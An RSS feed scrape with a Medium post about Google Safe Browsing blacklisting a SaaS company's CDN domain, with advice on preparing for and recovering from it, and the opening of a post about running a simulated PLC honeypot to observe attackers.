&lt;table border=&quot;0&quot; readability=&quot;0.80208333333333&quot;&gt;&lt;tr readability=&quot;1.6041666666667&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803324&quot; readability=&quot;0.069767441860465&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804222&quot; readability=&quot;1.3142857142857&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803142&quot; readability=&quot;3.528384279476&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.764192139738&quot;&gt;&lt;tr readability=&quot;3.528384279476&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25802936&quot; readability=&quot;5.4051724137931&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.7025862068966&quot;&gt;&lt;tr readability=&quot;5.4051724137931&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803016&quot; readability=&quot;5.5158227848101&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25805130&quot; readability=&quot;2.5989304812834&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2994652406417&quot;&gt;&lt;tr readability=&quot;2.5989304812834&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.4652406417112&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803967&quot; readability=&quot;0.97777777777778&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804409&quot; readability=&quot;2.34375&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803167&quot; readability=&quot;10.534959349593&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;5.2674796747967&quot;&gt;&lt;tr readability=&quot;10.534959349593&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;9.0983739837398&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25802843&quot; readability=&quot;2.3697478991597&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804052&quot; readability=&quot;0.63636363636364&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25802877&quot; readability=&quot;2.4201680672269&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2100840336134&quot;&gt;&lt;tr readability=&quot;2.4201680672269&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;</description>
<pubDate>Sat, 16 Jan 2021 15:19:41 +0000</pubDate>
<dc:creator>overallorder</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://news.ycombinator.com/item?id=25802714</dc:identifier>
</item>
<item>
<title>Google Safe Browsing can kill a startup</title>
<link>https://gomox.medium.com/google-safe-browsing-can-kill-your-startup-7d73c474b98d</link>
<guid isPermaLink="true" >https://gomox.medium.com/google-safe-browsing-can-kill-your-startup-7d73c474b98d</guid>
<description>&lt;div class=&quot;&quot;&gt;

&lt;div class=&quot;cs&quot;&gt;
&lt;div class=&quot;n cf go gp gq&quot;&gt;
&lt;div class=&quot;o n&quot;&gt;
&lt;div&gt;&lt;a rel=&quot;noopener&quot; href=&quot;https://gomox.medium.com/?source=post_page-----7d73c474b98d--------------------------------&quot;&gt;&lt;img alt=&quot;Gonzalo Sainz Trápaga&quot; class=&quot;s gr gs gt&quot; src=&quot;https://miro.medium.com/fit/c/56/56/1*F20cwqR0jJaLemWa4_vxww.png&quot; width=&quot;28&quot; height=&quot;28&quot;/&gt;&lt;/a&gt;&lt;/div&gt;

&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p id=&quot;ecbf&quot; class=&quot;hi hj fr hk b hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib di gn&quot;&gt;&lt;em class=&quot;ic&quot;&gt;If you are here in a panic because Google Safe Browsing has blacklisted your website or SaaS,&lt;/em&gt; &lt;a href=&quot;https://gomox.medium.com/google-safe-browsing-can-kill-your-startup-7d73c474b98d#d447&quot; class=&quot;do id&quot; rel=&quot;noopener&quot;&gt;&lt;em class=&quot;ic&quot;&gt;skip ahead to the section describing how to handle the situation&lt;/em&gt;&lt;/a&gt;&lt;em class=&quot;ic&quot;&gt;. There's also a lot of very interesting comments on&lt;/em&gt; &lt;a href=&quot;https://news.ycombinator.com/item?id=25802366&quot; class=&quot;do id&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;&lt;em class=&quot;ic&quot;&gt;the Hacker News comments page&lt;/em&gt;&lt;/a&gt;&lt;em class=&quot;ic&quot;&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p id=&quot;870c&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;In the old days, when Google (or any poorly tuned AI that Google unleashed) decided it wanted to kill your business, it would usually resort to denying access to one of its multiple walled gardens, and that was that. You've probably heard the horror stories:&lt;/p&gt;

I swear I have already checked the FAQ!
&lt;p id=&quot;bafa&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;They all fit &lt;span id=&quot;rmm&quot;&gt;t&lt;/span&gt;he same mold. First, a business, &lt;strong class=&quot;hk cv&quot;&gt;by choice&lt;/strong&gt;, uses Google services in a way that makes its survival entirely dependent on them. Second, Google, being the automated behemoth that Google is, does its thing: it ever so slightly adjusts the position of its own butt on its planet sized leather armchair, and, without really noticing, crushes a myriad of (relatively) ant-sized businesses in the process. Third, and finally, the ant-sized businesses desperately try to inform Google that they are being crushed, but they can only reach an automated suggestions box.&lt;/p&gt;
&lt;p id=&quot;eebd&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;Sometimes, the ant-sized CEO knows a higher up at Google because they were college buddies, or the CTO writes an ant-sized Medium post that somehow makes it to the front page of Hacker News mound. Then Google notices the ant-sized problem and sometimes deems it worthy of solving, usually for fear of regulatory repercussions that the ant revolution might entail.&lt;/p&gt;
&lt;p id=&quot;a65d&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;For this reason, conventional ant-sized wisdom dictates that if possible, you should not build your business to be overly reliant on Google's services. And if you manage to avoid depending on Google's multiple walled gardens to survive, you will probably be OK.&lt;/p&gt;

All this flat blue surface with a cool red roof thing! So convenient!
&lt;h2 id=&quot;6671&quot; class=&quot;js jt fr av ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp gn&quot;&gt;What's new under the sun&lt;/h2&gt;
&lt;p id=&quot;c619&quot; class=&quot;hi hj fr hk b hl kq hm hn ho kr hp hq hr ks hs ht hu kt hv hw hx ku hy hz ib di gn&quot;&gt;In today's episode of &quot;the Internet is not what it used to be&quot;, let's talk about a fresh new avenue for Google to inadvertently crush your startup that &lt;strong class=&quot;hk cv&quot;&gt;does not require you to use Google services in any (deliberate) way&lt;/strong&gt;.&lt;/p&gt;
&lt;p id=&quot;6aca&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;Did you know that it's possible for your site's domains to be blacklisted by Google for no particular reason, and that this blacklist is not only &lt;strong class=&quot;hk cv&quot;&gt;enforced directly in Google Chrome&lt;/strong&gt;, but also by several other software and hardware vendors? Did you know that these other vendors synchronize this list with wildly variable timings and interpretations, in a way that can make fixing any issues extremely stressful and unpredictable? Did you know that Google's ETA for reviewing a blacklist report, no matter how invalid, is measured in weeks?&lt;/p&gt;

This is now your website or SaaS application
&lt;p id=&quot;6a08&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;This blacklist &quot;feature&quot; is called &lt;a href=&quot;https://en.wikipedia.org/wiki/Google_Safe_Browsing&quot; class=&quot;do id&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;Google Safe Browsing&lt;/a&gt;, and the image here depicts the subtle message your users will see if one of your domains happens to be flagged in the Safe Browsing database. Warning texts range from &quot;deceptive site ahead&quot; to &quot;the site ahead contains malware&quot; (&lt;a href=&quot;https://support.google.com/chrome/answer/99020&quot; class=&quot;do id&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;see here for a full list&lt;/a&gt;), but they all share an equally scary red background design, and borderline impossible UI for people to skip the warning and use the site anyway.&lt;/p&gt;
&lt;p id=&quot;49dd&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;The first time we experienced this issue, we learned about it from a surge of customer reports that said that they were seeing the red warning page when trying to use our SaaS. The second time, we were better prepared and therefore had some free time to write this post.&lt;/p&gt;
&lt;p id=&quot;7464&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;For context, &lt;a href=&quot;https://www.invgate.com/&quot; class=&quot;do id&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;InvGate&lt;/a&gt; (our company) is a SaaS platform for IT departments that runs on AWS with over 1000 SME and enterprise customers, serving millions of end users. This means our product is used by IT teams to manage issues and requests from their own users. You can imagine the pleasant reaction of IT Managers when suddenly their IT ticketing system starts displaying such ominous security warnings to their end users.&lt;/p&gt;
&lt;p id=&quot;dcb3&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;When we first bumped into this problem, we frantically tried to understand what was going on and learning how Google Safe Browsing (GSB from now on) worked while our technical support team tried to keep up with customers reporting the issue. We quickly realized an &lt;a href=&quot;https://aws.amazon.com/cloudfront/&quot; class=&quot;do id&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;Amazon Cloudfront CDN&lt;/a&gt; URL that we used to serve static assets (CSS, Javascript and other media) had been flagged and this was causing our entire application to fail for the customer instances that were using that particular CDN. A quick review of the allegedly affected system showed that everything appeared normal.&lt;/p&gt;
&lt;p id=&quot;09ed&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;While our DevOps team was working in full emergency mode to get a new CDN set up and preparing to move customers over onto a new domain, I found that Google's documentation claims that GSB provides additional explanations about why a site has been flagged in the &lt;a href=&quot;https://search.google.com/search-console&quot; class=&quot;do id&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;Google Search Console&lt;/a&gt; (GSC from now on) of the offending site. I won't bore you with the details, but in order to access this information, you have to &lt;a href=&quot;https://support.google.com/webmasters/answer/9008080?hl=en&quot; class=&quot;do id&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;claim ownership of the site in GSC&lt;/a&gt;, which requires you to set up a custom DNS record or upload some files onto the root of the offending domain. We scrambled to do exactly that and after 20 minutes, managed to find the report about our site.&lt;/p&gt;
&lt;p id=&quot;3ed5&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;The report looked something like this:&lt;/p&gt;

That's… not particularly useful.
&lt;p id=&quot;4ffb&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;The report also contained a &quot;Request Review&quot; button that I promptly clicked without actually taking any action on the site, since there was no information whatsoever about the alleged problem. I filed for a review with a message noting that there were no offending URLs listed, despite documentation indicating that example URLs are always be provided by Google to assist webmasters in identifying issues.&lt;/p&gt;

Great! Requesting a review of an invalid report can cause my future reviews to be even slower.
&lt;p id=&quot;ed6c&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;Around an hour later, and before we had finished moving customers out of that CDN, our site was cleared from the GSB database. I received an automated email confirming that the review had been successful around 2 hours after that fact. No clarification was given about what caused the problem in the first place.&lt;/p&gt;
&lt;h2 id=&quot;5ecd&quot; class=&quot;js jt fr av ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp gn&quot;&gt;What happened after&lt;/h2&gt;
&lt;p id=&quot;17bb&quot; class=&quot;hi hj fr hk b hl kq hm hn ho kr hp hq hr ks hs ht hu kt hv hw hx ku hy hz ib di gn&quot;&gt;Over the week that followed this incident, and despite having had our URL cleared from the Safe Browsing blacklist, we continued to receive sporadic reports of companies having trouble to access our systems.&lt;/p&gt;
&lt;p id=&quot;0bd4&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;Google Safe Browsing provides two different APIs for both commercial and non-commercial software developers to use the blacklist in their products. In particular, we identified that at least some customers using Firefox were also running into issues, and both antivirus/antimalware software and network-wide security appliances from customers were also flagging our site and preventing users from accessing it &lt;strong class=&quot;hk cv&quot;&gt;many days after the issue had been resolved&lt;/strong&gt;.&lt;/p&gt;
&lt;p id=&quot;a185&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;We continued to move all the customers off the formerly blacklisted CDN and onto a new one, and the issue was therefore resolved for good. We never properly established the cause of the issue, but we chalked it up to some AI tripping on acid at Google's HQ.&lt;/p&gt;
&lt;h2 id=&quot;3fa0&quot; class=&quot;js jt fr av ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp gn&quot;&gt;How you can prevent Google Safe Browsing from flagging your site&lt;/h2&gt;
&lt;p id=&quot;1fea&quot; class=&quot;hi hj fr hk b hl kq hm hn ho kr hp hq hr ks hs ht hu kt hv hw hx ku hy hz ib di gn&quot;&gt;My 2 cents: If you run a SaaS business with an availability SLA, getting flagged by Google Safe Browsing for no particular reason represents a very real risk to business continuity.&lt;/p&gt;
&lt;p id=&quot;7208&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;Sadly, given the &lt;em class=&quot;ic&quot;&gt;oh-so-Googly&lt;/em&gt; opacity of the mechanism for flagging and reviewing sites, I don't think there is a way you can fully prevent this from happening to you. But you can certainly architect your app and processes to minimize the chances of it happening, lower the impact of actually being flagged, and minimize the time needed to circumvent the issue if it arises.&lt;/p&gt;
&lt;p id=&quot;8848&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;Here are the steps we are taking, and I therefore recommend:&lt;/p&gt;
&lt;ul class=&quot;&quot;&gt;&lt;li id=&quot;fae0&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib ij ik il gn&quot;&gt;&lt;strong class=&quot;hk cv&quot;&gt;Don't keep all your eggs in one basket, domain wise.&lt;/strong&gt; GSB appears to flag entire domains or subdomains. For that reason, it's a good idea to spread your applications over multiple domains, as that will reduce the impact of any single domain getting flagged. &lt;em class=&quot;ic&quot;&gt;For example: company.com for your website, app.company.net for your application, eucdn.company.net for customers in Europe, useastcdn.company.net for customers in the US East coast, etc.&lt;/em&gt;&lt;/li&gt;
&lt;li id=&quot;b707&quot; class=&quot;hi hj fr hk b hl im hm hn ho in hp hq hr io hs ht hu ip hv hw hx iq hy hz ib ij ik il gn&quot;&gt;&lt;strong class=&quot;hk cv&quot;&gt;Don't host any customer generated data in your main domains.&lt;/strong&gt; A lot of the cases of blacklisting that I found while researching this issue were caused by SaaS customers unknowingly uploading malicious files onto servers. Those files are harmless to the systems themselves, but their very existence can cause the whole domain to be blacklisted. Anything that your users upload onto your apps should be hosted outside your main domains. &lt;em class=&quot;ic&quot;&gt;For example: use companyusercontent.com to store files uploaded by customers&lt;/em&gt;.&lt;/li&gt;
&lt;li id=&quot;e55f&quot; class=&quot;hi hj fr hk b hl im hm hn ho in hp hq hr io hs ht hu ip hv hw hx iq hy hz ib ij ik il gn&quot;&gt;&lt;strong class=&quot;hk cv&quot;&gt;Proactively claim ownership of all your production domains in Google Search Console.&lt;/strong&gt; If you do, that won't prevent your site from being blacklisted, but you will get an email as it happens which will allow you to react quickly to the issue. It takes a little while to do, and it's precious time when you are actually dealing with an incident of this sort that is impacting your customers.&lt;/li&gt;
&lt;li id=&quot;fd13&quot; class=&quot;hi hj fr hk b hl im hm hn ho in hp hq hr io hs ht hu ip hv hw hx iq hy hz ib ij ik il gn&quot;&gt;&lt;strong class=&quot;hk cv&quot;&gt;Be ready to jump domains if you need to.&lt;/strong&gt; This is the hardest thing to do, but it's the only effective tool against being blacklisted: engineer your systems so that their referenced service domain names can easily be modified (by having scripts or orchestration tools available to perform this change), and possibly even have alternative names available and standing by. &lt;em class=&quot;ic&quot;&gt;For example, have eucdn.company2.net be a CNAME for eucdn.company.net, and if the first domain is blocked update the configuration of your app to load its assets from the alternate domain by using a tool.&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;d447&quot; class=&quot;js jt fr av ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp gn&quot;&gt;What to do if your SaaS app or website is blacklisted by Google Safe Browsing&lt;/h2&gt;
&lt;p id=&quot;9ebe&quot; class=&quot;hi hj fr hk b hl kq hm hn ho kr hp hq hr ks hs ht hu kt hv hw hx ku hy hz ib di gn&quot;&gt;Here's what I would recommend:&lt;/p&gt;
&lt;ul class=&quot;&quot;&gt;&lt;li id=&quot;6890&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib ij ik il gn&quot;&gt;If you can easily and quickly switch your app to a different domain name, that is &lt;strong class=&quot;hk cv&quot;&gt;the only thing that will reliably, quickly and pseudo-definitively resolve the incident&lt;/strong&gt;. If possible, do that. You're done.&lt;/li&gt;
&lt;li id=&quot;0560&quot; class=&quot;hi hj fr hk b hl im hm hn ho in hp hq hr io hs ht hu ip hv hw hx iq hy hz ib ij ik il gn&quot;&gt;Failing that, once you identify the blocked domain, review the reports that appear on Google Search Console. If you had not claimed ownership of the domain before this point, you will have to do it right now, which will take a while.&lt;/li&gt;
&lt;li id=&quot;5600&quot; class=&quot;hi hj fr hk b hl im hm hn ho in hp hq hr io hs ht hu ip hv hw hx iq hy hz ib ij ik il gn&quot;&gt;If your site has actually been hacked, fix the issue (i.e. delete offending content or hacked pages) and then request a security review. If your site has not been hacked or the Safe Browsing report is nonsensical, request a security review anyway and state that the report is incomplete.&lt;/li&gt;
&lt;li id=&quot;7487&quot; class=&quot;hi hj fr hk b hl im hm hn ho in hp hq hr io hs ht hu ip hv hw hx iq hy hz ib ij ik il gn&quot;&gt;Then, instead of waiting in agony, assuming that downtime is critical for your system or business, get to work on moving to a new domain name anyway. The review might take weeks.&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;4fb0&quot; class=&quot;js jt fr av ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp gn&quot;&gt;A cherry on top 🍒&lt;/h2&gt;
&lt;p id=&quot;d9f3&quot; class=&quot;hi hj fr hk b hl kq hm hn ho kr hp hq hr ks hs ht hu kt hv hw hx ku hy hz ib di gn&quot;&gt;The second time around, months after the first incident, we received an email from the Search Console warning us that one of our domains had been flagged. A few hours after this initial email report, being a G Suite domain administrator, I received another interesting email, which you can read below.&lt;/p&gt;

The &quot;sc&quot; in sc-noreply@google.com stands for &quot;Search Console&quot;
&lt;p id=&quot;b78e&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;Let me summarize what that is, because it’s quite mind blowing. This email refers to the Search Console blacklist alert emails. What this second e-mail says is that &lt;em class=&quot;ic&quot;&gt;G Suite’s automated phishing e-mail filter&lt;/em&gt; thinks &lt;em class=&quot;ic&quot;&gt;Google Search Console’s email&lt;/em&gt; about our domain being blacklisted is &lt;strong class=&quot;hk cv&quot;&gt;fake&lt;/strong&gt;. It most certainly &lt;strong class=&quot;hk cv&quot;&gt;is not&lt;/strong&gt;, since our domain was indeed blacklisted when we received the email. So Google &lt;strong class=&quot;hk cv&quot;&gt;can’t even decide whether its own email alerts about phishing are phishing&lt;/strong&gt;. (LOL? 🤔)&lt;/p&gt;
&lt;h2 id=&quot;bc56&quot; class=&quot;js jt fr av ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp gn&quot;&gt;Some chilling final thoughts about the future of the Internet&lt;/h2&gt;
&lt;p id=&quot;b952&quot; class=&quot;hi hj fr hk b hl kq hm hn ho kr hp hq hr ks hs ht hu kt hv hw hx ku hy hz ib di gn&quot;&gt;It's very clear to anyone working in tech that large corporate technology behemoths are to a great extent, gatekeepers of the Internet. But I tend to interpret that in a loose, metaphorical way. The Safe Browsing incident described in this post made it very clear that Google &lt;strong class=&quot;hk cv&quot;&gt;literally&lt;/strong&gt; controls who can access your website, no matter where and how you operate it. With Chrome having around 70% market share, and both Firefox and Safari using the GSB database to some extent, Google can with a flick of a bit singlehandedly make any site virtually inaccessible on the Internet.&lt;/p&gt;
&lt;p id=&quot;61f1&quot; class=&quot;hi hj fr hk b hl ie hm hn ho if hp hq hr ig hs ht hu ih hv hw hx ii hy hz ib di gn&quot;&gt;This is an extraordinary amount of power, and one that is not suitable for Google's &quot;&lt;em class=&quot;ic&quot;&gt;an AI will review your problem when and if it finds it convenient to do so&lt;/em&gt;&quot; approach.&lt;/p&gt;
</description>
<pubDate>Sat, 16 Jan 2021 14:32:10 +0000</pubDate>
<dc:creator>gomox</dc:creator>
<og:type>article</og:type>
<og:title>A fresh new avenue for Google to kill your SaaS startup</og:title>
<og:description>In the old days, when Google wanted you dead it would remove you from search results. But now, they can just block your site in Chrome.</og:description>
<og:url>https://gomox.medium.com/google-safe-browsing-can-kill-your-startup-7d73c474b98d</og:url>
<og:image>https://miro.medium.com/max/1200/1*5mudWNIzqA8WptZxwZxpOQ.png</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://gomox.medium.com/google-safe-browsing-can-kill-your-startup-7d73c474b98d</dc:identifier>
</item>
<item>
<title>Running a fake power plant on the internet for a month</title>
<link>https://grimminck.medium.com/running-a-fake-power-plant-on-the-internet-for-a-month-4a624f685aaa</link>
<guid isPermaLink="true" >https://grimminck.medium.com/running-a-fake-power-plant-on-the-internet-for-a-month-4a624f685aaa</guid>
<description>&lt;div class=&quot;&quot;&gt;

&lt;div class=&quot;cs&quot;&gt;
&lt;div class=&quot;n cf go gp gq&quot;&gt;
&lt;div class=&quot;o n&quot;&gt;
&lt;div&gt;
&lt;div class=&quot;ah gr gs&quot;&gt;

&lt;img alt=&quot;Stefan Grimminck&quot; class=&quot;s gy gs gr&quot; src=&quot;https://miro.medium.com/fit/c/56/56/2*94w5H_Yw6s2Rxxcitt4EeA.jpeg&quot; width=&quot;28&quot; height=&quot;28&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p id=&quot;f486&quot; class=&quot;hn ho fr hp b hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ig di gn&quot;&gt;People think of the internet as a host for services like banking websites, blogs and social networks. However, this is only a small part of everything connected. The internet is home to a big range of IoT systems and machines as well. These vary from simple “smart” light switches, to machinery used in industrial plants.&lt;/p&gt;
&lt;p id=&quot;0f66&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;One of the concerns stated in the yearly publ&lt;span id=&quot;rmm&quot;&gt;i&lt;/span&gt;cation by the Dutch government called “&lt;a href=&quot;https://www.rijksoverheid.nl/documenten/rapporten/2019/06/12/tk-bijlage-cybersecuritybeeld-nederland-csbn-2019&quot; class=&quot;do im&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;Cybersecuritybeeld Nederland&lt;/a&gt;” (2019) was the lack of insight into malicious digital (state sponsored) activity towards vital infrastructure. We (&lt;em class=&quot;in&quot;&gt;the Dutch&lt;/em&gt;) don’t know who is trying to hack our dams, locks, dikes and bridges.&lt;/p&gt;

&lt;p id=&quot;faa3&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;One of the systems often used to get more information about digital attackers are called honeypots. These mechanisms detect attempts at unauthorised use of computer systems. You could think of these as a digital version of bait cars used by the police to catch thieves. For this particular project I wrote a small &lt;a href=&quot;https://github.com/honeytrap/honeytrap&quot; class=&quot;do im&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;HoneyTrap&lt;/a&gt; listener (an open-source project by &lt;a href=&quot;https://dtact.com/&quot; class=&quot;do im&quot; target=&quot;_blank&quot; rel=&quot;noopener nofollow&quot;&gt;DTACT&lt;/a&gt;) that can interact with systems scanning for devices on the s7comm protocol.&lt;/p&gt;

&lt;p id=&quot;7b92&quot; class=&quot;hn ho fr hp b hq kh hr hs ht ki hu hv hw kj hx hy hz kk ia ib ic kl id ie ig di gn&quot;&gt;I decided to simulate a programmable logic controller, or PLC for short. In particular, a PLC that acts like a value regulator in a nuclear installation. PLCs interface with actuators and sensors to open valves, run motors and start pumps. They can be found everywhere from the rollercoasters in your local theme park to control boards for huge industrial pumpjacks. PLCs both act in the digital and physical space. This could make them very interesting for malicious actors, as a faulty system could potentially have catastrophic physical outcomes.&lt;/p&gt;
&lt;p id=&quot;c35b&quot; class=&quot;hn ho fr hp b hq ih hr hs ht ii hu hv hw ij hx hy hz ik ia ib ic il id ie ig di gn&quot;&gt;The simulation I created is very basic and is not considered “high-interaction”. After little interaction a skilled hacker would know that the system is actually a fake. However, this is not a concern of mine, as my sole purpose is to figure out who is responsible for the initial contact. Despite its simplicity, it was still able to deceive simple exploitation scripts in faking a system disruption.&lt;/p&gt;


